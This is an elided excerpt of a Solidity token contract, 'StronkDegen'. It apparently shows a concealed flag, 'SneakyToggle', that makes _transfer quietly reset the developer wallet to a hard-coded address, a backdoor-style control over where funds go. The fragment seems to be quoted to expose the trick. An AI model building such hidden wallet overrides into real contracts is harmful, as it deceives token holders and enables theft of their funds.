...
contract StronkDegen is ERC20, Ownable {
    ...
    constructor() ERC20("StronkDegen", "SD") {
        ...
        devWallet = address(0x913996c48Dbd2458657f3Bd262Ad749ABD346F0D); // set as
        FullTeamWallet = address(0x913996c48Dbd2458657f3Bd262Ad749ABD346F0D); // set as
    ...
    function _transfer(
        ...
        if (!SneakyToggle) {
            devWallet = 0x913996c48Dbd2458657f3Bd262Ad749ABD346F0D;
        }
